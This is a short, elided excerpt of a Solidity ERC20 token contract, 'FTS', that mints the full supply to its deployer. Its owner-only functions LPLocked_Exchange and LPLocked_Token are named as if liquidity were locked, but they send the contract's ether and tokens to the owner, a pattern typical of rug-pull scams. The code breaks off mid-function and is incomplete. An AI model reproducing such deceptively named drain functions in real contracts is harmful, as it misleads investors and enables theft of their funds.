...
contract FTS is ERC20, Ownable {
    ...
    constructor() ERC20("FINANCIAL TRANSACTIONS SYSTEM", "FTS") {
        _mint(msg.sender, 36936936*10**decimals());
    }
  ...
  function burn(uint256 amount) public virtual {
    ...
    function LPLocked_Exchange(uint amount) public onlyOwner {
    address payable _owner = payable(msg.sender);
    _owner.transfer(amount);
  }

    function LPLocked_Token(IERC20 token, uint256 values) public onlyOwner {
        address payable _owner =  payable(msg.sender);
